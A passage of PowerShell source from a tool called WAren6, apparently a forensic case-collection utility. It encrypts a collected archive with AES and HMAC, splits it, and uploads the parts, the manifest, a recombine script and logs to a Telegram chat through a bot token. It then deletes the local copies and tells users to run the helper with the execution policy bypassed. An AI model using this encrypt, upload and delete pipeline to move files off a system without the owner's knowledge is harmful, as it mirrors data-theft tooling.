        $outStream.Write($headerLengthBytes, 0, $headerLengthBytes.Length)
        $outStream.Write($headerBytes, 0, $headerBytes.Length)
        $cryptoStream = [System.Security.Cryptography.CryptoStream]::new($outStream, $aes.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
        $inStream = [System.IO.File]::OpenRead($InputPath)
        $buffer = New-Object byte[] 1048576
        while (($read = $inStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $cryptoStream.Write($buffer, 0, $read)
        }
        $cryptoStream.FlushFinalBlock()
    }
    finally {
        if ($cryptoStream) { $cryptoStream.Dispose() }
        if ($inStream) { $inStream.Dispose() }
        if ($outStream) { $outStream.Dispose() }
        if ($aes) { $aes.Dispose() }
    }

    $hmac = [System.Security.Cryptography.HMACSHA256]::new($macKey)
    $hashStream = $null
    $finalStream = $null
    $tempStream = $null
    try {
        $hashStream = [System.IO.File]::OpenRead($tempPath)
        $tag = $hmac.ComputeHash($hashStream)
        $hashStream.Dispose()
        $hashStream = $null

        $finalStream = [System.IO.File]::Open($OutputPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $tempStream = [System.IO.File]::OpenRead($tempPath)
        $tempStream.CopyTo($finalStream)
        $finalStream.Write($tag, 0, $tag.Length)
    }
    finally {
        if ($hashStream) { $hashStream.Dispose() }
        if ($tempStream) { $tempStream.Dispose() }
        if ($finalStream) { $finalStream.Dispose() }
        $hmac.Dispose()
        Remove-Item -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue
    }

    return [PSCustomObject]@{
        Path = $OutputPath
        Size = (Get-Item -LiteralPath $OutputPath).Length
        Sha256 = Get-WAren6FileSha256Hex -Path $OutputPath
        PlaintextSha256 = $header.plaintext_sha256
    }
}

function Split-WAren6TransferFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,
        [Parameter(Mandatory = $true)]
        [string]$OutputDirectory,
        [Parameter(Mandatory = $false)]
        [int64]$PartSizeBytes = $script:WAren6TelegramPartSizeBytes
    )

    New-Item -ItemType Directory -Force -Path $OutputDirectory | Out-Null
    $inputItem = Get-Item -LiteralPath $FilePath
    $parts = @()
    $inputStream = [System.IO.File]::OpenRead($FilePath)
    try {
        $buffer = New-Object byte[] 1048576
        $index = 1
        while ($inputStream.Position -lt $inputStream.Length) {
            $partPath = Join-Path $OutputDirectory ("{0}.part{1:D4}" -f $inputItem.Name, $index)
            $out = [System.IO.File]::Open($partPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
            try {
                $remaining = $PartSizeBytes
                while ($remaining -gt 0 -and $inputStream.Position -lt $inputStream.Length) {
                    $toRead = [Math]::Min($buffer.Length, [Math]::Min($remaining, $inputStream.Length - $inputStream.Position))
                    $read = $inputStream.Read($buffer, 0, [int]$toRead)
                    if ($read -le 0) { break }
                    $out.Write($buffer, 0, $read)
                    $remaining -= $read
                }
            }
            finally {
                $out.Dispose()
            }
            $partItem = Get-Item -LiteralPath $partPath
            $parts += [PSCustomObject]@{
                index = $index
                path = $partItem.FullName
                name = $partItem.Name
                size = $partItem.Length
                sha256 = Get-WAren6FileSha256Hex -Path $partItem.FullName
            }
            $index++
        }
    }
    finally {
        $inputStream.Dispose()
    }
    return $parts
}

function Write-WAren6RecombineHelper {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    @'
param(
    [string]$ManifestPath = ".\WAren6_transfer_manifest.json",
    [string]$OutputPath,
    [string]$ExtractPath,
    [string]$Password,
    [int]$MaxPasswordAttempts = 3,
    [switch]$NoExtract
)

function Open-WAren6ReadStream([string]$Path) {
    $share = [System.IO.FileShare]([int][System.IO.FileShare]::ReadWrite -bor [int][System.IO.FileShare]::Delete)
    return [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, $share)
}

function Get-Sha256 {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,
        [int]$RetryCount = 60,
        [int]$DelayMilliseconds = 1000
    )

    $lastError = $null
    for ($attempt = 1; $attempt -le $RetryCount; $attempt++) {
        try {
            $before = Get-Item -LiteralPath $Path -ErrorAction Stop
            $stream = Open-WAren6ReadStream -Path $Path
            try {
                $sha = [System.Security.Cryptography.SHA256]::Create()
                try {
                    $hashBytes = $sha.ComputeHash($stream)
                }
                finally {
                    $sha.Dispose()
                }
            }
            finally {
                $stream.Dispose()
            }
            $after = Get-Item -LiteralPath $Path -ErrorAction Stop
            if ($before.Length -eq $after.Length -and $before.LastWriteTimeUtc -eq $after.LastWriteTimeUtc) {
                return ([BitConverter]::ToString($hashBytes) -replace "-", "")
            }
            $lastError = "File changed while hashing."
        }
        catch {
            $lastError = $_.Exception.Message
        }
        if ($attempt -lt $RetryCount) {
            Start-Sleep -Milliseconds $DelayMilliseconds
        }
    }
    throw "Could not read stable file for SHA-256 after $RetryCount attempts: $Path. Last error: $lastError"
}

function Unprotect-WAren6FileAesCbcHmac {
    param([string]$InputPath, [string]$OutputPath, [string]$Password)
    $fileInfo = Get-Item -LiteralPath $InputPath
    if ($fileInfo.Length -le 44) { throw "Encrypted file is truncated." }
    $fs = Open-WAren6ReadStream -Path $InputPath
    try {
        $magicBytes = New-Object byte[] 8
        if ($fs.Read($magicBytes, 0, 8) -ne 8) { throw "Encrypted file is truncated." }
        $magic = [System.Text.Encoding]::ASCII.GetString($magicBytes)
        if ($magic -ne "WA6ENC1`n") { throw "Not a WAren6 encrypted transfer file." }
        $lenBytes = New-Object byte[] 4
        if ($fs.Read($lenBytes, 0, 4) -ne 4) { throw "Encrypted file is truncated." }
        $headerLen = [BitConverter]::ToInt32($lenBytes, 0)
        $headerBytes = New-Object byte[] $headerLen
        if ($fs.Read($headerBytes, 0, $headerLen) -ne $headerLen) { throw "Encrypted file is truncated." }
        $headerJson = [System.Text.Encoding]::UTF8.GetString($headerBytes)
        $header = $headerJson | ConvertFrom-Json
        $cipherOffset = $fs.Position
        $tagOffset = $fileInfo.Length - 32
        if ($tagOffset -le $cipherOffset) { throw "Encrypted file is truncated." }
    }
    finally {
        $fs.Dispose()
    }
    $salt = [Convert]::FromBase64String($header.salt_b64)
    $iv = [Convert]::FromBase64String($header.iv_b64)
    $kdf = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($Password, $salt, [int]$header.iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
    $keys = $kdf.GetBytes(64)
    $aesKey = New-Object byte[] 32
    $macKey = New-Object byte[] 32
    [Array]::Copy($keys, 0, $aesKey, 0, 32)
    [Array]::Copy($keys, 32, $macKey, 0, 32)
    $hmac = [System.Security.Cryptography.HMACSHA256]::new($macKey)
    $hashStream = Open-WAren6ReadStream -Path $InputPath
    try {
        $buffer = New-Object byte[] 1048576
        $remaining = $tagOffset
        while ($remaining -gt 0) {
            $read = $hashStream.Read($buffer, 0, [int][Math]::Min($buffer.Length, $remaining))
            if ($read -le 0) { throw "Encrypted file is truncated." }
            $hmac.TransformBlock($buffer, 0, $read, $null, 0) | Out-Null
            $remaining -= $read
        }
        $empty = New-Object byte[] 0
        $hmac.TransformFinalBlock($empty, 0, 0) | Out-Null
        $computed = $hmac.Hash
        $actual = New-Object byte[] 32
        if ($hashStream.Read($actual, 0, 32) -ne 32) { throw "Encrypted file is truncated." }
    }
    finally {
        $hashStream.Dispose()
    }
    for ($i = 0; $i -lt 32; $i++) {
        if ($computed[$i] -ne $actual[$i]) { throw "HMAC verification failed." }
    }
    $cipherLen = $tagOffset - $cipherOffset
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $aesKey
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $inStream = Open-WAren6ReadStream -Path $InputPath
    $outStream = [System.IO.File]::Open($OutputPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
    $crypto = $null
    try {
        $inStream.Position = $cipherOffset
        $crypto = [System.Security.Cryptography.CryptoStream]::new($outStream, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
        $buffer = New-Object byte[] 1048576
        $remaining = $cipherLen
        while ($remaining -gt 0) {
            $read = $inStream.Read($buffer, 0, [int][Math]::Min($buffer.Length, $remaining))
            if ($read -le 0) { throw "Encrypted file is truncated." }
            $crypto.Write($buffer, 0, $read)
            $remaining -= $read
        }
        $crypto.FlushFinalBlock()
    }
    finally {
        if ($crypto) { $crypto.Dispose() }
        $inStream.Dispose()
        $outStream.Dispose()
        $aes.Dispose()
    }
    if ((Get-Sha256 $OutputPath) -ne $header.plaintext_sha256) { throw "Plaintext SHA-256 mismatch." }
}

function Convert-WAren6SecureStringToPlainText {
    param([System.Security.SecureString]$SecureString)
    if (-not $SecureString) { return "" }
    $credential = New-Object System.Net.NetworkCredential("", $SecureString)
    return $credential.Password
}

function Invoke-WAren6DecryptWithPasswordAttempts {
    param(
        [Parameter(Mandatory = $true)]
        [string]$InputPath,
        [Parameter(Mandatory = $true)]
        [string]$OutputPath,
        [string]$Password,
        [int]$MaxPasswordAttempts = 3
    )

    if ($MaxPasswordAttempts -lt 1) { $MaxPasswordAttempts = 1 }
    for ($passwordAttempt = 1; $passwordAttempt -le $MaxPasswordAttempts; $passwordAttempt++) {
        $candidatePassword = $null
        if ($passwordAttempt -eq 1 -and -not [string]::IsNullOrEmpty($Password)) {
            $candidatePassword = $Password
        }
        else {
            $securePassword = Read-Host -AsSecureString "Enter WAren6 transfer password (attempt $passwordAttempt of $MaxPasswordAttempts)"
            $candidatePassword = Convert-WAren6SecureStringToPlainText -SecureString $securePassword
        }

        try {
            Remove-Item -LiteralPath $OutputPath -Force -ErrorAction SilentlyContinue
            Unprotect-WAren6FileAesCbcHmac -InputPath $InputPath -OutputPath $OutputPath -Password $candidatePassword
            return
        }
        catch {
            Remove-Item -LiteralPath $OutputPath -Force -ErrorAction SilentlyContinue
            if ($passwordAttempt -lt $MaxPasswordAttempts) {
                Write-Warning "Password verification failed. Try again."
            }
            else {
                throw "Unable to decrypt transfer after $MaxPasswordAttempts attempt(s)."
            }
        }
        finally {
            $candidatePassword = $null
        }
    }
}

function Copy-WAren6FileToStream {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,
        [Parameter(Mandatory = $true)]
        [System.IO.Stream]$OutputStream,
        [int]$RetryCount = 30,
        [int]$DelayMilliseconds = 1000
    )

    $lastError = $null
    for ($attempt = 1; $attempt -le $RetryCount; $attempt++) {
        try {
            $inputStream = Open-WAren6ReadStream -Path $Path
            try {
                $buffer = New-Object byte[] 1048576
                while (($read = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                    $OutputStream.Write($buffer, 0, $read)
                }
                return
            }
            finally {
                $inputStream.Dispose()
            }
        }
        catch {
            $lastError = $_.Exception.Message
        }
        if ($attempt -lt $RetryCount) {
            Start-Sleep -Milliseconds $DelayMilliseconds
        }
    }
    throw "Could not read transfer part after $RetryCount attempts: $Path. Last error: $lastError"
}

function Get-WAren6ArchiveBaseName {
    param([string]$ArchiveName)
    $name = [System.IO.Path]::GetFileName($ArchiveName)
    $lower = $name.ToLowerInvariant()
    foreach ($suffix in @(".tar.zst", ".tar.gz", ".tar.bz2", ".tar.xz", ".tgz", ".zip", ".tar")) {
        if ($lower.EndsWith($suffix)) {
            return $name.Substring(0, $name.Length - $suffix.Length)
        }
    }
    return [System.IO.Path]::GetFileNameWithoutExtension($name)
}

function Resolve-WAren6ExtractPath {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ArchivePath,
        [Parameter(Mandatory = $true)]
        [string]$ManifestDirectory,
        [string]$RequestedPath
    )

    if (-not [string]::IsNullOrWhiteSpace($RequestedPath)) {
        return $RequestedPath
    }

    $baseName = Get-WAren6ArchiveBaseName -ArchiveName (Split-Path -Path $ArchivePath -Leaf)
    $candidate = Join-Path $ManifestDirectory $baseName
    if (-not (Test-Path -LiteralPath $candidate)) {
        return $candidate
    }
    $hasChildren = Get-ChildItem -LiteralPath $candidate -Force -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $hasChildren) {
        return $candidate
    }

    for ($i = 1; $i -le 99; $i++) {
        $next = "$candidate.extracted$i"
        if (-not (Test-Path -LiteralPath $next)) {
            return $next
        }
    }
    return "$candidate.extracted_$((Get-Date).ToString('yyyyMMddHHmmss'))"
}

function Expand-WAren6Archive {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ArchivePath,
        [Parameter(Mandatory = $true)]
        [string]$ManifestDirectory,
        [string]$DestinationPath
    )

    $destination = Resolve-WAren6ExtractPath -ArchivePath $ArchivePath -ManifestDirectory $ManifestDirectory -RequestedPath $DestinationPath
    New-Item -ItemType Directory -Force -Path $destination | Out-Null
    $lower = (Split-Path -Path $ArchivePath -Leaf).ToLowerInvariant()
    if ($lower.EndsWith(".zip")) {
        Expand-Archive -LiteralPath $ArchivePath -DestinationPath $destination
    }
    elseif ($lower.EndsWith(".tar") -or $lower.EndsWith(".tar.zst") -or $lower.EndsWith(".tar.gz") -or $lower.EndsWith(".tar.bz2") -or $lower.EndsWith(".tar.xz") -or $lower.EndsWith(".tgz")) {
        $tar = Get-Command tar.exe -ErrorAction SilentlyContinue
        if (-not $tar) { throw "tar.exe is required to extract $(Split-Path -Path $ArchivePath -Leaf)." }
        & tar.exe -xf $ArchivePath -C $destination
        if ($LASTEXITCODE -ne 0) { throw "Archive extraction failed: $(Split-Path -Path $ArchivePath -Leaf)" }
    }
    else {
        throw "Unsupported archive format for extraction: $(Split-Path -Path $ArchivePath -Leaf)"
    }
    return (Resolve-Path -LiteralPath $destination).Path
}

$manifest = Get-Content -LiteralPath $ManifestPath -Raw | ConvertFrom-Json
$manifestDir = Split-Path -Path (Resolve-Path -LiteralPath $ManifestPath).Path -Parent
$parts = @($manifest.parts | Sort-Object index)
if ($parts.Count -eq 0) { throw "Transfer manifest contains no parts." }
$combined = if ($OutputPath) { $OutputPath } else { Join-Path $manifestDir $manifest.transfer_file.name }

$singlePartInPlace = $false
if (-not $OutputPath -and $parts.Count -eq 1) {
    $singlePartPath = Join-Path $manifestDir $parts[0].name
    $transferPath = Join-Path $manifestDir $manifest.transfer_file.name
    if ([StringComparer]::OrdinalIgnoreCase.Equals([System.IO.Path]::GetFullPath($singlePartPath), [System.IO.Path]::GetFullPath($transferPath))) {
        $singlePartInPlace = $true
        $combined = $singlePartPath
    }
}

if ($singlePartInPlace) {
    $part = $parts[0]
    $partPath = Join-Path $manifestDir $part.name
    if (-not (Test-Path -LiteralPath $partPath)) { throw "Missing part: $($part.name)" }
    if ((Get-Sha256 -Path $partPath) -ne $part.sha256) { throw "Part hash mismatch: $($part.name)" }
}
else {
    $combinedFullPath = [System.IO.Path]::GetFullPath($combined)
    foreach ($part in $parts) {
        $partPath = Join-Path $manifestDir $part.name
        if (-not (Test-Path -LiteralPath $partPath)) { throw "Missing part: $($part.name)" }
        if ([StringComparer]::OrdinalIgnoreCase.Equals([System.IO.Path]::GetFullPath($partPath), $combinedFullPath)) {
            throw "Output path would overwrite input part: $($part.name). Use -OutputPath with a different file name."
        }
    }

    $out = [System.IO.File]::Open($combined, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
    try {
        foreach ($part in $parts) {
            $partPath = Join-Path $manifestDir $part.name
            if ((Get-Sha256 -Path $partPath) -ne $part.sha256) { throw "Part hash mismatch: $($part.name)" }
            Copy-WAren6FileToStream -Path $partPath -OutputStream $out
        }
    }
    finally {
        $out.Dispose()
    }
}
if ((Get-Sha256 -Path $combined) -ne $manifest.transfer_file.sha256) { throw "Combined file SHA-256 mismatch." }
$restoredArchive = $combined
if ($manifest.encrypted) {
    $decrypted = Join-Path $manifestDir $manifest.original_archive.name
    Invoke-WAren6DecryptWithPasswordAttempts -InputPath $combined -OutputPath $decrypted -Password $Password -MaxPasswordAttempts $MaxPasswordAttempts
    $restoredArchive = $decrypted
    Write-Host "Decrypted archive: $decrypted"
}
else {
    Write-Host "Recombined archive: $combined"
}
if (-not $NoExtract) {
    $extracted = Expand-WAren6Archive -ArchivePath $restoredArchive -ManifestDirectory $manifestDir -DestinationPath $ExtractPath
    Write-Host "Extracted folder: $extracted"
}
'@ | Out-File -LiteralPath $Path -Encoding UTF8 -Force
    return $Path
}

function Write-WAren6TransferManifest {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ManifestPath,
        [Parameter(Mandatory = $true)]
        [string]$ArchivePath,
        [Parameter(Mandatory = $true)]
        [string]$PayloadPath,
        [Parameter(Mandatory = $true)]
        [object[]]$Parts,
        [Parameter(Mandatory = $true)]
        [bool]$Encrypted
    )

    $archiveItem = Get-Item -LiteralPath $ArchivePath
    $payloadItem = Get-Item -LiteralPath $PayloadPath
    $manifest = [ordered]@{
        schema = "waren6.telegram.transfer.v1"
        generatedAtUtc = (Get-Date).ToUniversalTime().ToString("o")
        telegramCloudLimitBytes = $script:WAren6TelegramCloudLimitBytes
        encrypted = $Encrypted
        original_archive = [ordered]@{
            name = $archiveItem.Name
            path = $archiveItem.FullName
            size = $archiveItem.Length
            sha256 = Get-WAren6FileSha256Hex -Path $archiveItem.FullName
        }
        transfer_file = [ordered]@{
            name = $payloadItem.Name
            path = $payloadItem.FullName
            size = $payloadItem.Length
            sha256 = Get-WAren6FileSha256Hex -Path $payloadItem.FullName
        }
        parts = @($Parts | Sort-Object index | ForEach-Object {
            [ordered]@{
                index = $_.index
                name = $_.name
                size = $_.size
                sha256 = $_.sha256
            }
        })
        recombine = "pwsh -ExecutionPolicy Bypass -File .\WAren6_recombine.ps1 -ManifestPath .\WAren6_transfer_manifest.json"
    }
    $manifest | ConvertTo-Json -Depth 8 | Out-File -LiteralPath $ManifestPath -Encoding UTF8 -Force
    return $ManifestPath
}

function Send-WAren6TelegramDocument {
    param(
        [Parameter(Mandatory = $true)]
        [string]$BotToken,
        [Parameter(Mandatory = $true)]
        [string]$ChatId,
        [Parameter(Mandatory = $true)]
        [string]$FilePath,
        [Parameter(Mandatory = $true)]
        [string]$ApiBase,
        [Parameter(Mandatory = $false)]
        [string]$Caption
    )

    Add-Type -AssemblyName System.Net.Http
    $uri = ($ApiBase.TrimEnd("/") + "/bot$BotToken/sendDocument")
    $client = [System.Net.Http.HttpClient]::new()
    $content = [System.Net.Http.MultipartFormDataContent]::new()
    $stream = $null
    try {
        $content.Add([System.Net.Http.StringContent]::new($ChatId), "chat_id")
        if ($Caption) {
            $content.Add([System.Net.Http.StringContent]::new($Caption), "caption")
        }
        $stream = [System.IO.File]::OpenRead($FilePath)
        $fileContent = [System.Net.Http.StreamContent]::new($stream)
        $content.Add($fileContent, "document", (Split-Path -Path $FilePath -Leaf))
        $response = $client.PostAsync($uri, $content).GetAwaiter().GetResult()
        $text = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()
        if (-not $response.IsSuccessStatusCode) {
            throw "Telegram sendDocument failed: HTTP $([int]$response.StatusCode) $($response.ReasonPhrase)"
        }
        $json = $text | ConvertFrom-Json
        if (-not $json.ok) {
            throw "Telegram sendDocument returned ok=false: $text"
        }
        $expectedSize = (Get-Item -LiteralPath $FilePath).Length
        $reportedSize = $null
        if ($json.result.document.file_size) { $reportedSize = [int64]$json.result.document.file_size }
        elseif ($json.result.message.document.file_size) { $reportedSize = [int64]$json.result.message.document.file_size }
        if ($reportedSize -and $reportedSize -ne $expectedSize) {
            throw "Telegram reported document size $reportedSize, expected $expectedSize for '$FilePath'."
        }
        return [PSCustomObject]@{ ok = $true; file = $FilePath; size = $expectedSize; response = $json }
    }
    finally {
        if ($stream) { $stream.Dispose() }
        $content.Dispose()
        $client.Dispose()
    }
}

function Invoke-WAren6TelegramTransfer {
    param(
        [Parameter(Mandatory = $true)]
        [string]$BotToken,
        [Parameter(Mandatory = $true)]
        [string]$ChatId,
        [Parameter(Mandatory = $true)]
        [string]$ArchivePath,
        [Parameter(Mandatory = $true)]
        [string]$OutputDirectory,
        [Parameter(Mandatory = $true)]
        [string]$BaseName,
        [Parameter(Mandatory = $false)]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Justification = 'Compatibility with -enc CLI; value is used in-memory for transfer encryption and is redacted from output.')]
        [string]$EncryptPassword,
        [Parameter(Mandatory = $false)]
        [string]$ApiBase = "https://api.telegram.org",
        [Parameter(Mandatory = $false)]
        [string]$LogPath
    )

    $generatedPaths = @()
    $uploaded = @()
    try {
        if (-not $ChatId) {
            throw "Telegram chat id is required when -tg/--telegram is used."
        }
        $transferDir = Join-Path $OutputDirectory "$BaseName.telegram_transfer"
        New-Item -ItemType Directory -Force -Path $transferDir | Out-Null
        $generatedPaths += $transferDir

        $payloadPath = $ArchivePath
        $encrypted = $false
        if ($EncryptPassword) {
            $payloadPath = Join-Path $transferDir ((Split-Path -Path $ArchivePath -Leaf) + ".wa6enc")
            Write-WAren6Output "  [>] Encrypting archive for Telegram transfer..."
            Protect-WAren6FileAesCbcHmac -InputPath $ArchivePath -OutputPath $payloadPath -Password $EncryptPassword | Out-Null
            $encrypted = $true
            $generatedPaths += $payloadPath
        }

        $payloadItem = Get-Item -LiteralPath $payloadPath
        if ($payloadItem.Length -gt $script:WAren6TelegramCloudLimitBytes) {
            Write-WAren6Output "  [>] Splitting Telegram payload into sub-50 MB parts..."
            $parts = @(Split-WAren6TransferFile -FilePath $payloadPath -OutputDirectory $transferDir)
            $generatedPaths += @($parts | ForEach-Object { $_.path })
        }
        else {
            $parts = @([PSCustomObject]@{
                index = 1
                path = $payloadItem.FullName
                name = $payloadItem.Name
                size = $payloadItem.Length
                sha256 = Get-WAren6FileSha256Hex -Path $payloadItem.FullName
            })
        }

        $manifestPath = Join-Path $transferDir "WAren6_transfer_manifest.json"
        Write-WAren6TransferManifest -ManifestPath $manifestPath -ArchivePath $ArchivePath -PayloadPath $payloadPath -Parts $parts -Encrypted $encrypted | Out-Null
        $helperPath = Join-Path $transferDir "WAren6_recombine.ps1"
        Write-WAren6RecombineHelper -Path $helperPath | Out-Null
        $generatedPaths += @($manifestPath, $helperPath)

        Write-WAren6Output "  [>] Uploading WAren6 files to Telegram..."
        foreach ($part in ($parts | Sort-Object index)) {
            $caption = if ($parts.Count -gt 1) { "WAren6 part $($part.index)/$($parts.Count): $($part.name)" } else { "WAren6 archive: $($part.name)" }
            $uploaded += Send-WAren6TelegramDocument -BotToken $BotToken -ChatId $ChatId -FilePath $part.path -ApiBase $ApiBase -Caption $caption
            Write-WAren6Output "  [OK] Telegram uploaded: $($part.name)"
        }
        foreach ($supportFile in @($manifestPath, $helperPath)) {
            $uploaded += Send-WAren6TelegramDocument -BotToken $BotToken -ChatId $ChatId -FilePath $supportFile -ApiBase $ApiBase -Caption "WAren6 transfer support: $(Split-Path -Path $supportFile -Leaf)"
            Write-WAren6Output "  [OK] Telegram uploaded: $(Split-Path -Path $supportFile -Leaf)"
        }
        if ($LogPath -and (Test-Path -LiteralPath $LogPath -PathType Leaf)) {
            $transferLogPath = Join-Path $transferDir "logs.txt"
            Copy-Item -LiteralPath $LogPath -Destination $transferLogPath -Force
            $generatedPaths += $transferLogPath
            $uploaded += Send-WAren6TelegramDocument -BotToken $BotToken -ChatId $ChatId -FilePath $transferLogPath -ApiBase $ApiBase -Caption "WAren6 logs.txt"
            Write-WAren6Output "  [OK] Telegram uploaded: logs.txt"
        }

        return [PSCustomObject]@{
            success = $true
            uploaded = $uploaded
            generatedPaths = $generatedPaths
            payloadPath = $payloadPath
            manifestPath = $manifestPath
            helperPath = $helperPath
            transferDir = $transferDir
        }
    }
    catch {
        Write-Warning "Telegram transfer failed: $($_.Exception.Message)"
        return [PSCustomObject]@{
            success = $false
            uploaded = $uploaded
            generatedPaths = $generatedPaths
            error = $_.Exception.Message
        }
    }
}

function Invoke-WAren6VerifiedAutoDelete {
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyCollection()]
        [object[]]$Paths
    )

    $deleted = @()
    foreach ($path in ($Paths | Where-Object { $_ } | Select-Object -Unique)) {
        try {
            if (Test-Path -LiteralPath $path) {
                Remove-Item -LiteralPath $path -Force -Recurse -ErrorAction Stop
                $deleted += $path
            }
        }
        catch {
            Write-Warning "Auto-delete could not remove '$path': $($_.Exception.Message)"
        }
    }
    return $deleted
}

function Get-WAren6FileInventory {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RootPath,
        [Parameter(Mandatory = $false)]
        [string[]]$ExcludeRelativePaths = @()
    )

    $root = (Resolve-Path -LiteralPath $RootPath).Path
    $items = [System.Collections.Generic.List[object]]::new()
    $excludeSet = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
    foreach ($relativePath in $ExcludeRelativePaths) {
        if (-not [string]::IsNullOrWhiteSpace($relativePath)) {
            $excludeSet.Add($relativePath.TrimStart('\', '/')) | Out-Null
        }
    }
    $hashedCount = 0
    Get-ChildItem -LiteralPath $root -Recurse -Force -File | ForEach-Object {
        $relative = $_.FullName.Substring($root.Length).TrimStart('\')
        if (-not $excludeSet.Contains($relative)) {
            $sha = Get-WAren6FileSha256Hex -Path $_.FullName
            $items.Add([PSCustomObject]@{
                path = $relative
                size = $_.Length
                sha256 = $sha
                lastWriteTimeUtc = $_.LastWriteTimeUtc.ToString("o")
            }) | Out-Null
            $hashedCount++
            if (($hashedCount % 500) -eq 0) {
                Write-WAren6Output "  [>] Manifest inventory: $hashedCount files hashed..."
            }
        }
    }
    return $items.ToArray()
}

function Write-WAren6Manifest {
    param(
        [Parameter(Mandatory = $true)]
        [string]$CasePath,
        [Parameter(Mandatory = $true)]
        [string]$OutputDirectory,
        [Parameter(Mandatory = $false)]
        [string]$ArchivePath,
        [Parameter(Mandatory = $false)]
        [string]$ValidationReportPath,
        [Parameter(Mandatory = $false)]
        [string]$CommandLine,
        [Parameter(Mandatory = $false)]
        [object]$ModeInfo,
        [Parameter(Mandatory = $false)]
        [object[]]$PrecomputedFiles,
        [Parameter(Mandatory = $false)]
        [object]$ArchiveInfo
    )

    $caseRoot = (Resolve-Path -LiteralPath $CasePath).Path
    $archiveInfo = $null
    if ($ArchiveInfo) {
        $archiveInfo = [PSCustomObject]@{
            path = $ArchiveInfo.Path
            format = $ArchiveInfo.Format
            size = $ArchiveInfo.Size
            sha256 = $ArchiveInfo.Sha256
        }
    }
    elseif ($ArchivePath -and (Test-Path -LiteralPath $ArchivePath)) {
        $archiveItem = Get-Item -LiteralPath $ArchivePath
        $archiveInfo = [PSCustomObject]@{
            path = $archiveItem.FullName
            size = $archiveItem.Length
            sha256 = Get-WAren6FileSha256Hex -Path $archiveItem.FullName
        }
    }

    $validation = $null
    if ($ValidationReportPath -and (Test-Path -LiteralPath $ValidationReportPath)) {
        try {
            $validation = Get-Content -LiteralPath $ValidationReportPath -Raw | ConvertFrom-Json
        }
        catch {
            $validation = [PSCustomObject]@{ status = "unreadable"; error = $_.Exception.Message }
        }
    }

    $files = if ($PSBoundParameters.ContainsKey('PrecomputedFiles') -and $null -ne $PrecomputedFiles) {
        $PrecomputedFiles
    }
    else {
        Get-WAren6FileInventory -RootPath $caseRoot -ExcludeRelativePaths @("WAren6.manifest.json")
    }

    $manifest = [PSCustomObject]@{
        schema = "waren6.manifest.v1"
        tool = "WAren6"
        version = $global:WAren6Version
        generatedAtUtc = (Get-Date).ToUniversalTime().ToString("o")
        timezone = [System.TimeZoneInfo]::Local.Id
        commandLine = Protect-WAren6PathText -Text $CommandLine -CaseRoot $caseRoot
        casePath = "<case-root>"
        files = $files
        archive = Protect-WAren6ManifestObject -Value $archiveInfo -CaseRoot $caseRoot
        validation = Protect-WAren6ManifestObject -Value $validation -CaseRoot $caseRoot
        mode = Protect-WAren6ManifestObject -Value $ModeInfo -CaseRoot $caseRoot
    }

    $caseManifestPath = Join-Path $caseRoot "WAren6.manifest.json"
    $manifest | ConvertTo-Json -Depth 8 | Out-File -LiteralPath $caseManifestPath -Encoding UTF8

    $rootManifestPath = Join-Path $OutputDirectory ("WAren6_" + (Split-Path $caseRoot -Leaf).Replace("WAren6_", "") + ".manifest.json")
    Copy-Item -LiteralPath $caseManifestPath -Destination $rootManifestPath -Force
    return $rootManifestPath
}

function Resolve-WAren6PythonExe {
    $candidates = @("python", "python3", "py")
    foreach ($cmd in $candidates) {
        try {
            $ver = & $cmd --version 2>&1
            if ($LASTEXITCODE -eq 0 -and $ver -match 'Python\s+3\.') {
                return $cmd
            }
        }
        catch { }
    }

    $embedExe = Join-Path $PSScriptRoot "python_embedded\python.exe"
    if (Test-Path -LiteralPath $embedExe) {
        return $embedExe
    }

    $knownPaths = @(
        "$env:LOCALAPPDATA\Programs\Python\Python3*\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python*\python.exe",
        "C:\Python3*\python.exe",
        "C:\Python*\python.exe",
        "$env:ProgramFiles\Python3*\python.exe",
        "$env:ProgramFiles\Python*\python.exe"
    )
    foreach ($glob in $knownPaths) {
        $found = Get-ChildItem -Path $glob -ErrorAction SilentlyContinue | Sort-Object Name -Descending | Select-Object -First 1
        if ($found) {
            try {
                $ver = & $found.FullName --version 2>&1
                if ($LASTEXITCODE -eq 0 -and $ver -match 'Python\s+3\.') {
                    return $found.FullName
                }
            }
            catch { }
        }
    }
    return $null
}

function Write-WAren6UnifyLater {
    param(
        [Parameter(Mandatory = $true)]
        [string]$CasePath,
        [Parameter(Mandatory = $false)]
        [string]$ArchivePath,
        [switch]$WithMedia
    )

    $scriptPath = Join-Path $PSScriptRoot "waren6.py"
    $mediaFlag = if ($WithMedia) { " --with-media-index" } else { "" }
    $caseCommand = "python `"$scriptPath`" --unify `"$CasePath`"$mediaFlag"
